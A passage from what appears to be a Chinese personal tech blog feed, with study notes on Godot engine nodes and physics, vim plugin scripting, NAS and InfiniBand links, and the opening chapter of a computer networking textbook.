class="hljs-params">sprite</span>)</span><br></code></pre></td></tr></table></figure><p>可以看出，每一个节点都是一个对象。在编辑器中能够做到的，在代码中也能够做到.</p><h1 id="18-场景树"><a href="#18-场景树" class="headerlink" title="18. 场景树"></a>18. 场景树</h1><p>第一个节点是 root 节点 (即根节点), 可以在左边栏的 Remote 中看到，local 中的节点实际上会在运行时挂载到 root 节点上.</p><h1 id="19-帧率"><a href="#19-帧率" class="headerlink" title="19. 帧率"></a>19. 帧率</h1><p>FPS, Frames Per Second, 之图片每多少秒刷新一次。</p><p>使用代码设置如:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">Engine.target_fps</span> = <span class="hljs-number">120</span><br></code></pre></td></tr></table></figure><p>delta 指的是两帧之间的时间差.</p><h1 id="20-节点active生命周期"><a href="#20-节点active生命周期" class="headerlink" title="20. 节点active生命周期"></a>20. 节点active生命周期</h1><p>从节点树上往下运行.</p><p>运行顺序: <code>_enter_tree()</code> -&gt; <code>_ready()</code> -&gt; <code>_process()</code> -&gt; <code>_exit_tree()</code></p><h1 id="21-节点inactive生命周期-移除节点"><a href="#21-节点inactive生命周期-移除节点" class="headerlink" title="21. 节点inactive生命周期(移除节点)"></a>21. 节点inactive生命周期(移除节点)</h1><p>删除节点时是从下往上删除.</p><h1 id="22-节点的获取方式"><a href="#22-节点的获取方式" class="headerlink" title="22. 节点的获取方式"></a>22. 节点的获取方式</h1><p>在代码中获取一个节点.</p><p>你的脚本挂载到哪一个节点，<code>self</code> 就指代哪一个节点.</p><p>如:</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gml"><span class="hljs-keyword">var</span> currentNode1 = $<span class="hljs-string">&quot;.&quot;</span><br><span class="hljs-keyword">var</span> currentNode2 = <span class="hljs-variable language_">self</span><br></code></pre></td></tr></table></figure><p><code>get_node()</code> 函数，像文件路径一样获取节点.</p><p>直接打印一个节点时，打印的是节点的 Hash 值:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-variable">$Node</span>)</span></span><br></code></pre></td></tr></table></figure><p>打印节点名称用:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-variable">$Node</span>.name)</span></span><br></code></pre></td></tr></table></figure><p>在变量声明中 (这里指所有函数之外) 获取一个节点，不能直接使用 <code>var node = $Node</code> 需要加上 <code>onready</code> 关键字. 因为 <code>$</code> 这种写法只能出现在函数内，使用 <code>onready</code> 就相当于在 <code>_ready()</code> 这个函数中运行.</p><h1 id="23-渲染帧和物理帧-process和physics-process"><a href="#23-渲染帧和物理帧-process和physics-process" class="headerlink" title="23. 渲染帧和物理帧(process和physics_process)"></a>23. 渲染帧和物理帧(process和physics_process)</h1><p><code>_process()</code> 是在 delta time 间隔之间执行的. 也就是说，代码在每一帧之前执行.</p><p><code>_process()</code> 用于实时反应.</p><p>可以用  <code>_physics_process</code> 做计时的逻辑.</p><h1 id="24-parent和owner"><a href="#24-parent和owner" class="headerlink" title="24. parent和owner"></a>24. parent和owner</h1><p>owner 是顶部节点，顶部节点的 owner 是 null. <code>owner</code> 可直接使用. 可以算一个预对象.</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(owner.name)</span></span><br></code></pre></td></tr></table></figure><h1 id="25-信号signal"><a href="#25-信号signal" class="headerlink" title="25. 信号signal"></a>25. 信号signal</h1><p>Godot 官方建议在开发中更多的使用信号来完成模块间的通信.</p><p>触发信号执行一个函数.</p><p>使用代码控制信号:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">connect</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p>所有的对象都有 <code>connect()</code> 方法，因为所有的对象都继承于 Object 对象，<code>connect()</code> 是 Object 对象的成员函数.</p><h1 id="26-自定义信号"><a href="#26-自定义信号" class="headerlink" title="26. 自定义信号"></a>26. 自定义信号</h1><p><code>emit_signal</code> 也是 Object 对象的成员函数.</p><p>自定义信号参数的使用 。</p><h1 id="27-异步回调yield"><a href="#27-异步回调yield" class="headerlink" title="27. 异步回调yield"></a>27. 异步回调yield</h1><p>第一种使用:<br><code>yeild()</code> 用来挂起。其产生的返回值存储在一个地方.</p><p><code>resume()</code> 用来恢复.</p><p>一般代码的执行，如一个函数, 是等到其返回了之后才执行下一行代码，而使用 <code>yeild()</code> 则不需要等待.</p><p>第二种使用，用信号判断恢复. 监听某一个节点的某一个信号.</p><p>第三种方法，利用 <code>yeild()</code> 结束时会释放的 <code>completed</code> 信号.</p><h1 id="28-多线程"><a href="#28-多线程" class="headerlink" title="28. 多线程"></a>28. 多线程</h1><p>使用内部的类 <code>Thread</code>.</p><p>一个线程会分配到一个 CPU 的核心中运算.</p><p>数据不一致问题利用锁解决.</p><h1 id="29-屏幕窗口设置"><a href="#29-屏幕窗口设置" class="headerlink" title="29. 屏幕窗口设置"></a>29. 屏幕窗口设置</h1><p>息屏可设置.</p><h1 id="30-单位和像素"><a href="#30-单位和像素" class="headerlink" title="30. 单位和像素"></a>30. 单位和像素</h1><p>屏幕分辨率 (屏幕像素), 屏幕上的像素点数.</p><p>图片像素.</p><p>在 Godot 中, 一般 position 的 1 个单位长度等于 1 个图片像素.</p><h1 id="31-垂直同步"><a href="#31-垂直同步" class="headerlink" title="31. 垂直同步"></a>31. 垂直同步</h1><p>Vertical Sync. 在 Godot 中默认开启.</p><p>垂直同步的信号是由显示器发出. 送入显卡 3D 图形处理部分</p><h1 id="32-屏幕坐标"><a href="#32-屏幕坐标" class="headerlink" title="32. 屏幕坐标"></a>32. 屏幕坐标</h1><p>屏幕坐标系的原点在左上角. 因为以前 CRT 显像管是从左上角开始扫描的.</p><h1 id="33-全局和相对坐标的相互转化"><a href="#33-全局和相对坐标的相互转化" class="headerlink" title="33. 全局和相对坐标的相互转化"></a>33. 全局和相对坐标的相互转化</h1><p><code>position</code> 属性是该节点相对于父节点的相对位置.</p><p><code>global_position</code> 是全局位置 (即与 root 根节点的相对位置).</p><h1 id="34-深度遍历显示节点"><a href="#34-深度遍历显示节点" class="headerlink" title="34. 深度遍历显示节点"></a>34. 深度遍历显示节点</h1><p>Godot 中的所有东西都是场景. </p><p>场景之下也可以挂载场景.</p><h1 id="35-Sprite节点和Image类的使用"><a href="#35-Sprite节点和Image类的使用" class="headerlink" title="35. Sprite节点和Image类的使用"></a>35. Sprite节点和Image类的使用</h1><p>所有的 2D 节点和 GUI 节点都继承于 CanvasItem 节点。</p><p>右边栏中可以判断出这个节点是继承于那些节点.</p><p>可以直接在代码中保存图片.</p><p>Image 类可以直接操作原始的图片.</p><h1 id="36-向量的基础"><a href="#36-向量的基础" class="headerlink" title="36. 向量的基础"></a>36. 向量的基础</h1><p>向量，有方向的量.</p><p>可直接获取向量的长度, 使用 <code>length()</code> 方法.</p><p><code>normalize()</code> 转化为单位向量.</p><p>有向量点积和差积的算法, 使用 <code>dot()</code> 和 <code>cross()</code> 方法.</p><p>可直接返回两个向量的夹角，使用 <code>angle_to()</code> 方法.</p><h1 id="37-通过输入事件来控制物体移动"><a href="#37-通过输入事件来控制物体移动" class="headerlink" title="37. 通过输入事件来控制物体移动"></a>37. 通过输入事件来控制物体移动</h1><p>如，将鼠标，键盘，触控等，以事件的形式发送到应用程序.</p><p>获取可视界面的大小:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">screen_size</span> = get_viewport_rect().size<br></code></pre></td></tr></table></figure><p>限制在可视界面中:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">position.x = <span class="hljs-built_in">clamp</span>(position.x, <span class="hljs-number">0</span>, screen_size.y)<br>position.y = <span class="hljs-built_in">clamp</span>(position.y, <span class="hljs-number">0</span>, screen_size.y)<br><br></code></pre></td></tr></table></figure><p>Project Setting -&gt; Input Map 中的都是事件。</p><h1 id="38-物理系统"><a href="#38-物理系统" class="headerlink" title="38. 物理系统"></a>38. 物理系统</h1><p>大多表现在碰撞.</p><h1 id="39-RigidBody节点"><a href="#39-RigidBody节点" class="headerlink" title="39. RigidBody节点"></a>39. RigidBody节点</h1><p>刚体必须带有形状.</p><p>给物体简单的形状可以减少计算量.</p><p>可以调整刚体的质量，加速度, 线速度，角速度, 受力, 力矩等.</p><p>这样看来就是完全模拟的一个物理世界的物体.</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(info.collider.name)</span></span><br></code></pre></td></tr></table></figure><p>可以打印出与什么节点碰撞.</p><h1 id="40-刚体实战"><a href="#40-刚体实战" class="headerlink" title="40. 刚体实战"></a>40. 刚体实战</h1><p>光是 <code>CollisionPolygon2D</code> 不会显示出形状，可以添加 <code>Polygon2Dl</code> 节点添加一个多边形.</p><p>Area2D, 是一块区域，能够检测到物体的碰撞，但是不会做任何操作.</p><h1 id="41-刚体的Layer和Mask"><a href="#41-刚体的Layer和Mask" class="headerlink" title="41. 刚体的Layer和Mask"></a>41. 刚体的Layer和Mask</h1><p>Layer 表明物体位于哪一层.</p><p>Mask 是物体去检测哪一层会和他碰撞.</p><p>Layer 是所属组.</p><p>Mask 是目标组.</p><h1 id="42-Line2D节点"><a href="#42-Line2D节点" class="headerlink" title="42. Line2D节点"></a>42. Line2D节点</h1><p>可以通过点的组合绘制线. 本质是通过二维向量数组来保存每一个点的坐标.</p><p>可以通过代码创建这些点. 用 <code>add_point()</code> 方法:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add_point</span><span class="hljs-params">(Vector2(<span class="hljs-number">100</span>, <span class="hljs-number">100</span>)</span></span>)<br></code></pre></td></tr></table></figure><p>线有宽度可以设置。宽度可以渐变.</p><p>给 Player 添加幻影:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss">func <span class="hljs-built_in">_process</span>():<br>    var player = <span class="hljs-built_in">get_parent</span>().<span class="hljs-built_in">find_node</span>(<span class="hljs-string">&quot;Player&quot;</span>)<br>    var position = player.position<br>    add.<span class="hljs-built_in">point</span>(position)<br>    if (<span class="hljs-built_in">get_point_count</span>() &gt;= <span class="hljs-number">20</span>):<br>    <span class="hljs-built_in">remove_point</span>(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>还需要设置点的宽度的变化.</p><h1 id="43-RemoteTransform2D节点"><a href="#43-RemoteTransform2D节点" class="headerlink" title="43. RemoteTransform2D节点"></a>43. RemoteTransform2D节点</h1><p>起到一个代理的作用. 相当于一个分身.</p><h1 id="44-Path2D节点"><a href="#44-Path2D节点" class="headerlink" title="44. Path2D节点"></a>44. Path2D节点</h1><p>一般和 PathFolloww2D 节点结合使用.</p><p>可以用 Path2D 节点画出一个路径 (就像一个轨道). 挂载一个 PathFolloww2D 节点就可以沿着路径移动. offset 就是物体距离 path 原点的距离. 在代码中增加 offset 就可以达到移动的效果.</p><p>利用 offset 和 offset 到达的边界值设置重复.</p><h1 id="45-Tilemap节点初探"><a href="#45-Tilemap节点初探" class="headerlink" title="45. Tilemap节点初探"></a>45. Tilemap节点初探</h1><p>Tilemap 一般用于画地图. </p><p>一个 Tile Set 可以保存下来复用.</p><h1 id="46-TileMap节点的BitMask"><a href="#46-TileMap节点的BitMask" class="headerlink" title="46. TileMap节点的BitMask"></a>46. TileMap节点的BitMask</h1><p>BitMask 配合自动填充.</p><p>BitMask 选中的区域就是想要用来自动填充的区域. (这样讲，BitMask 选中的部分会检测四周是否存在用 BitMask 选中的图块以及 Icon 图块，如果有，就以 BitMask 中的相对位置显示)</p><p>一般选择规则图形.</p><p>Icon 属性选择的是默认绘制的图像.</p><h1 id="47-TileMap节点的Collision"><a href="#47-TileMap节点的Collision" class="headerlink" title="47. TileMap节点的Collision"></a>47. TileMap节点的Collision</h1><p>记住 TileMap 中有 Collision 选项其实就好.</p><h1 id="48-Navigation2D节点"><a href="#48-Navigation2D节点" class="headerlink" title="48. Navigation2D节点"></a>48. Navigation2D节点</h1><p>可以实现自动寻路，其使用 AStar 算法.</p><p>其必须和 TileMap 配合使用.</p><p>预加载节点示例代码:</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">onready <span class="hljs-built_in">var</span> nav_2d : Navigation2D = $Navigation2D<br></code></pre></td></tr></table></figure><p><code>_unhandled_input()</code> 方法，处理没有被其他节点捕获的 input event.</p>]]></content>
    
    
    <categories>
      
      <category>Godot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>什么是 ib 交换机, RDMA, NIC, ipoib, nfs, cx3</title>
    <link href="/2022/11/10/%E4%BB%80%E4%B9%88%E6%98%AF-ib-%E4%BA%A4%E6%8D%A2%E6%9C%BA-RDMA-NIC-ipoib-nfs-cx3/"/>
    <url>/2022/11/10/%E4%BB%80%E4%B9%88%E6%98%AF-ib-%E4%BA%A4%E6%8D%A2%E6%9C%BA-RDMA-NIC-ipoib-nfs-cx3/</url>
    
    <content type="html"><![CDATA[<p><a href="https://youle.zhipin.com/articles/5a15a64ab255c437qxB93dm1.html">什么是 InfiniBand 参考</a></p><p><a href="https://zhuanlan.zhihu.com/p/55142557">什么是 RDMA 参考</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>算法导论-Notes</title>
    <link href="/2022/11/10/%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA-Notes/"/>
    <url>/2022/11/10/%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA-Notes/</url>
    
    <content type="html"><![CDATA[<p><a href="http://mitpress.mit.edu/algorithms">习题答案所在网站</a></p><h1 id="第一章-算法在计算中的作用"><a href="#第一章-算法在计算中的作用" class="headerlink" title="第一章 算法在计算中的作用"></a>第一章 算法在计算中的作用</h1><p><mark>数据结构</mark> 是一种存储和组织数据的方式，旨在便于访问和修改.</p><h2 id="1-2-作为一种技术的算法"><a href="#1-2-作为一种技术的算法" class="headerlink" title="1.2  作为一种技术的算法"></a>1.2  作为一种技术的算法</h2><p>时间和空间资源.</p><h1 id="第二章-算法基础"><a href="#第二章-算法基础" class="headerlink" title="第二章 算法基础"></a>第二章 算法基础</h1><h2 id="2-1-插入排序"><a href="#2-1-插入排序" class="headerlink" title="2.1 插入排序"></a>2.1 插入排序</h2><p>其对于少量元素的排序较为有效.</p><p>参数: 一个长度为 n 的数组.</p>]]></content>
    
    
    <categories>
      
      <category>Algorithms</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>什么是-NAS</title>
    <link href="/2022/11/10/%E4%BB%80%E4%B9%88%E6%98%AF-NAS/"/>
    <url>/2022/11/10/%E4%BB%80%E4%B9%88%E6%98%AF-NAS/</url>
    
    <content type="html"><![CDATA[<p><a href="https://baike.baidu.com/item/NAS/3465615">参考 百科</a></p><p>NAS 是 Network Attached Storage (网络附属存储) 的简称. 又称 “网络存储器”, 也就是用来存放数据。</p><p>NAS 通常在一个 LAN 上占有自己的节点，无需应用服务器的干预，允许用户在网络上存取数据.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>如何编写-vim-插件</title>
    <link href="/2022/11/10/%E5%A6%82%E4%BD%95%E7%BC%96%E5%86%99-vim-%E6%8F%92%E4%BB%B6/"/>
    <url>/2022/11/10/%E5%A6%82%E4%BD%95%E7%BC%96%E5%86%99-vim-%E6%8F%92%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="写函数示例"><a href="#写函数示例" class="headerlink" title="写函数示例"></a>写函数示例</h1><h2 id="function-中-“-”-的作用"><a href="#function-中-“-”-的作用" class="headerlink" title="function! 中 “!” 的作用"></a>function! 中 “!” 的作用</h2><p>如果有同名的函数则将其重载.</p><h2 id="函数跨文件使用"><a href="#函数跨文件使用" class="headerlink" title="函数跨文件使用"></a>函数跨文件使用</h2><p>如:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">function!</span> <span class="hljs-title">initself</span>#exit_iron<span class="hljs-params">()</span><br><br><span class="hljs-keyword">endfunction</span><br></code></pre></td></tr></table></figure><p>前面的 <code>initself</code> 是函数所在的文件名, <code>exit_iron</code> 是函数名.</p><h1 id="autocmd-使用"><a href="#autocmd-使用" class="headerlink" title="autocmd 使用"></a>autocmd 使用</h1><p>需要用 <code>augroup</code> 包裹. 对同一个组多次使用 <code>augroup</code> 其会叠加.</p><p>用 <code>augroup</code> 可能是方便组织.<br>如:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">augroup</span> testgroup<br>    <span class="hljs-keyword">autocmd</span> BufWrite * :<span class="hljs-keyword">echom</span> <span class="hljs-string">&quot;cat&quot;</span><br><span class="hljs-keyword">augroup</span> END<br><br><span class="hljs-keyword">augroup</span> testgroup<br>    <span class="hljs-keyword">autocmd</span> BufWrite * :<span class="hljs-keyword">echom</span> <span class="hljs-string">&quot;dog&quot;</span><br><span class="hljs-keyword">augroup</span> END<br></code></pre></td></tr></table></figure><p>要想重写则使用 <code>autocmd!</code></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">augroup</span> testgroup<br>    autocmd!<br>    <span class="hljs-keyword">autocmd</span> BufWrite * :<span class="hljs-keyword">echom</span> <span class="hljs-string">&quot;dog&quot;</span><br><span class="hljs-keyword">augroup</span> END<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>vim-中-&lt;Plug&gt;-的作用</title>
    <link href="/2022/11/10/vim-%E4%B8%AD-%3CPlug%3E-%E7%9A%84%E4%BD%9C%E7%94%A8/"/>
    <url>/2022/11/10/vim-%E4%B8%AD-%3CPlug%3E-%E7%9A%84%E4%BD%9C%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://vi.stackexchange.com/questions/31012/what-does-plug-do-in-vim">参考</a></p><p><code>&lt;Plug&gt;</code> 并不代表一个实际的键值. 结合博文和个人理解，其作用为:<br>相当于一个别名，比如:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">nnoremap</span> <span class="hljs-symbol">&lt;silent&gt;</span> <span class="hljs-symbol">&lt;plug&gt;</span>(SubversiveSubstitute) :<span class="hljs-symbol">&lt;c-u&gt;</span><span class="hljs-keyword">call</span> subversive#singleMotion#preSubstitute(<span class="hljs-variable">v:register</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;&#x27;</span>)<span class="hljs-symbol">&lt;cr&gt;</span>:<span class="hljs-keyword">set</span> opfunc=subversive#singleMotion#substituteMotion<span class="hljs-symbol">&lt;cr&gt;</span>g@<br></code></pre></td></tr></table></figure><p>这一行的意思可以理解为，在使用 <code>nnoremap</code> 时，可以用 <code>&lt;plug&gt;(SubversiveSubstitute)</code> 来替换后面的内容.</p><p>主要是作者并不想确定一个键位，想让使用者自己定义，如定义为:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">nmap</span> gc <span class="hljs-symbol">&lt;plug&gt;</span>(SubversiveSubstitute)    <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Archlinux-上-matlab-安装</title>
    <link href="/2022/11/09/Archlinux-%E4%B8%8A-matlab-%E5%AE%89%E8%A3%85/"/>
    <url>/2022/11/09/Archlinux-%E4%B8%8A-matlab-%E5%AE%89%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<p><a href="https://ww2.mathworks.cn/support/search.html/answers/130613-internet.html?fq%5B%5D=asset_type_name:answer&fq%5B%5D=category:support/introduct1740&page=1">参考</a></p>]]></content>
    
    
    <categories>
      
      <category>Matlab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>计算机自顶向下方法 Notes</title>
    <link href="/2022/11/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95-Notes/"/>
    <url>/2022/11/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95-Notes/</url>
    
    <content type="html"><![CDATA[<p><a href="http://gaia.cs.umass.edu/kurose_ross/interactive/?q=c1q1_c1q2">配套网站</a></p><h1 id="第一章-计算机网络和因特网"><a href="#第一章-计算机网络和因特网" class="headerlink" title="第一章 计算机网络和因特网"></a>第一章 计算机网络和因特网</h1><h2 id="1-1-什么是因特网"><a href="#1-1-什么是因特网" class="headerlink" title="1.1 什么是因特网"></a>1.1 什么是因特网</h2><h3 id="1-1-1-具体构成描述"><a href="#1-1-1-具体构成描述" class="headerlink" title="1.1.1 具体构成描述"></a>1.1.1 具体构成描述</h3><p>所有连接因特网的设备都称为<mark>主机</mark> (host) 或<mark>端系统</mark> (end system).</p><p>端系统通过<mark>通信链路</mark> (communication link) 和分组交换机 (packet switch) 连接到一起。</p><h3 id="1-1-2-服务描述"><a href="#1-1-2-服务描述" class="headerlink" title="1.1.2 服务描述"></a>1.1.2 服务描述</h3><p><mark>分布式应用程序</mark> (distributed application), 其应用程序涉及多个相互交换数据的端系统。(这里的多个端系统如多人游戏, 在线社交)</p><p>因特网有发送数据的程序必须遵循的套接字接口 (规定了一些规则, 如除了要发送的数据之外要提供的信息).</p><h3 id="1-1-3-什么是协议"><a href="#1-1-3-什么是协议" class="headerlink" title="1.1.3 什么是协议"></a>1.1.3 什么是协议</h3><p><mark>协议 (protocol) 定义了在两个或多个通信实体之间交换的报文的格式和顺序, 以及报文发送或接收一条报文或其他事件所采取的动作</mark> </p><h2 id="1-2-网络边缘"><a href="#1-2-网络边缘" class="headerlink" title="1.2 网络边缘"></a>1.2 网络边缘</h2><p>通常把与因特网相连的计算机和其他设备称为端系统 (end system, 因为他们处于互联网的边缘).</p><p>主机和端系统概念相同.</p><h3 id="1-2-1-接入网"><a href="#1-2-1-接入网" class="headerlink" title="1.2.1 接入网"></a>1.2.1 接入网</h3><p>指将端系统物理连接到其边缘路由器 (edge router) 的网络.</p><p>DSL (Digital Subscriber Line, 数字用户线), 由于上行传输速率和下行传输速率是不同的, 因此也被称为是不对称的.</p><p>上行似乎为发送数据, 下行似乎为下载或接收数据.</p><p>电缆因特网接入 (cable Internet access), 其一个重要特征就是共享广播媒体. </p><p>光纤到户 (Fiber To The Home, FTTH) 为从本地中心局直接到家庭提供一条光纤路径.</p><p>每个家庭具有一个光纤网络端接器 (Optical Network Terminator, ONT), 它由专门的光纤连接到邻近的分配器 (splitter). 该分配器把一些家庭集结到一根共享的光纤, 该光纤再连接到本地电话和公司的中心局中的光纤路端接器 (Optical Line Terminator, OLT). OLT 提供了光信号和电信号之间的转换.<br><img src="/../img/optical_line_terminator.png"></p><h4 id="2-企业-和家庭-接入-以太网和-WIFI"><a href="#2-企业-和家庭-接入-以太网和-WIFI" class="headerlink" title="2. 企业 (和家庭) 接入: 以太网和 WIFI"></a>2. 企业 (和家庭) 接入: 以太网和 WIFI</h4><h3 id="1-2-2-物理媒体"><a href="#1-2-2-物理媒体" class="headerlink" title="1.2.2 物理媒体"></a>1.2.2 物理媒体</h3><p>物理媒介分成两种类型:</p><ul><li>导引型媒体 (guided media), 电波沿着固体媒介前行</li><li>非导引型媒体 (unguided media), 电波在空气或外层空间中传播</li></ul><p>物理链路的实际成本与其他网络成本相比通常是相当小的.</p><h4 id="1-双绞铜线"><a href="#1-双绞铜线" class="headerlink" title="1. 双绞铜线"></a>1. 双绞铜线</h4><p><img src="/../img/two_copper_wires.jpg"></p><p>其由两根绝缘的铜线组成, 每根大约 1mm 粗, 一规则的螺旋状排列.</p><p>两根线绞合起来， 以减少邻近类似的双绞线的电气干扰</p><p>双绞线的数据传输速率取决于线的粗细以及传输方和接收方之间的距离.</p><h4 id="2-同轴电缆"><a href="#2-同轴电缆" class="headerlink" title="2. 同轴电缆"></a>2. 同轴电缆</h4><p>同轴电缆由两个铜导体组成， 这两个导体是同心的而不是并行的.</p><p>同轴电缆能被用作导引型共享媒体 (shared medium).</p><p>许多端系统能够直接与该电缆相连， 每个端系统都能接收由其他端系统发送的内容.</p><h4 id="3-光纤"><a href="#3-光纤" class="headerlink" title="3. 光纤"></a>3. 光纤</h4><p>光纤是一种细而柔软的，能够导引光脉冲的媒体，每个脉冲表示一个比特。</p><p>光纤不受电磁干扰，光缆信号衰减极低，难以窃听.</p><p>光纤能用于长途引导型传输媒体，特别是跨海链路.</p><p>高成本的光设备，如发射器，接收器和交换机，阻碍光纤在端提传输中的应用.</p><h4 id="4-陆地无线电信道"><a href="#4-陆地无线电信道" class="headerlink" title="4. 陆地无线电信道"></a>4. 陆地无线电信道</h4><p>无线电信道承载电磁频谱中的信号。</p><p>其不需要安装物理线路，</p><p>其极大依赖于传播环境和信号传输的距离.</p><h4 id="5-卫星无线电信道"><a href="#5-卫星无线电信道" class="headerlink" title="5. 卫星无线电信道"></a>5. 卫星无线电信道</h4><p>一颗通信卫星连接地球上的两个或多个微博发射器&#x2F;接收器，它们被称为地面站。该卫星在一个频段上接收传输，使用一个转发器再生信号，并在另一个频率上发射信号.</p><h2 id="1-3-网络核心"><a href="#1-3-网络核心" class="headerlink" title="1.3 网络核心"></a>1.3 网络核心</h2><h3 id="1-3-1-分组交换"><a href="#1-3-1-分组交换" class="headerlink" title="1.3.1 分组交换"></a>1.3.1 分组交换</h3><p>将长报文划分为较小的数据块.</p><h4 id="1-存储转发传输-store-and-forward-transmission"><a href="#1-存储转发传输-store-and-forward-transmission" class="headerlink" title="1. 存储转发传输 (store-and-forward transmission)"></a>1. 存储转发传输 (store-and-forward transmission)</h4><p>一种转发机制. 指在交换机能够开始向输出链路传输该分组的第一个比特之前，必须接收到整个分组.</p><p>意思就是，一个分组的第一个比特到达交换机时不会被立即转发出去，而是等到这个分组的所有比特都到达时开始转发.</p><h4 id="2-排队时延和分组丢失"><a href="#2-排队时延和分组丢失" class="headerlink" title="2. 排队时延和分组丢失"></a>2. 排队时延和分组丢失</h4><p>没太分组交换机有多条链路与之相连， 对于每条相连的链路，该分组交换机具有一个输出缓存 (output buffer, 也称输出队列 output queue)，用于存储路由器准备发往那条链路的分组.</p><p>分组到达时，链路正忙于传输其他分组，该到达分组就必须在缓存中等待. 此时有排队时延 (queuing delay).</p><p>分组到达时，缓存空间被占满，将出现分组丢包 (packet loss).</p><h4 id="3-转发表和路由选择协议"><a href="#3-转发表和路由选择协议" class="headerlink" title="3. 转发表和路由选择协议"></a>3. 转发表和路由选择协议</h4><p>因特网具有一些特殊的路由选择协议 (routing protocol), 用于自动地设置这些转发表. 如选择最短的路径.</p><h3 id="1-3-2-电路交换"><a href="#1-3-2-电路交换" class="headerlink" title="1.3.2 电路交换"></a>1.3.2 电路交换</h3><p>通过网络链路和交换机移动数据有两种基本方法:</p><ul><li>电路交换 (circuit switching)</li><li>分组交换 (packet switching)</li></ul><p>电路交换在发送方能够发送信息之前，该网络必须在发送放和接收方之间建立一条连接. 其需要预留端系统间沿路径通信所需要的资源.</p><p>当网络创建这种电路时，它也在连接期间在该网络链路上预留了恒定的传输速率.</p><p>也就是说要先分配资源，再开始传输.</p><h4 id="1-电路交换网络中的复用"><a href="#1-电路交换网络中的复用" class="headerlink" title="1. 电路交换网络中的复用"></a>1. 电路交换网络中的复用</h4><p>链路中的电路是通过频分复用 (Frequency-Division Multiplexing, FDM) 或时分复用 (Time-Division Multiplexing, TDM) 来实现.</p><p>FDM, 链路为每条连接设专用的一个频段.</p><p>TDM, 时间被划分为固定期间的帧，并且每个帧又被划分为固定数量的时隙。也就是说一条链路中的数据不是连续的单个电路的数据，而是混合的，每一个电路占一部分. 两个时隙表明有两条电路，10 个时隙表明有十条电路.<br><img src="/../img/explain_FDM_TDM.png"></p><h4 id="2-分组交换与电路交换的对比"><a href="#2-分组交换与电路交换的对比" 